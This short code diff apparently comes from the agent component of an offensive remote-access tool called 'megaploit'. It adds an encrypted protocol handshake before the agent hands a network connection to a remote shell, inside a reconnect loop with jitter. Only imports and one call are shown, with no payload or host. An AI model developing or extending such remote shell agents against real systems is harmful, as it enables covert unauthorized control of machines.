@@ -25,6 +25,7 @@ import time
 
 from megaploit.core.config import AUTH_TIMEOUT, RECONNECT_DELAY, RECONNECT_JITTER
 from megaploit.core.crypto import agent_authenticate, load_key
+from megaploit.core.protocol import handshake_agent
 from megaploit.agent.shell import run_shell
 
 # ---------------------------------------------------------------------------
@@ -93,6 +94,9 @@ def start(secret_key_path: str = "secret.key") -> None:
                 conn.close()
                 _sleep_with_jitter()
                 continue
+
+            # Negotiate v2 encrypted protocol
+            handshake_agent(conn, secret_key)
 
             conn.settimeout(None)
             run_shell(conn)
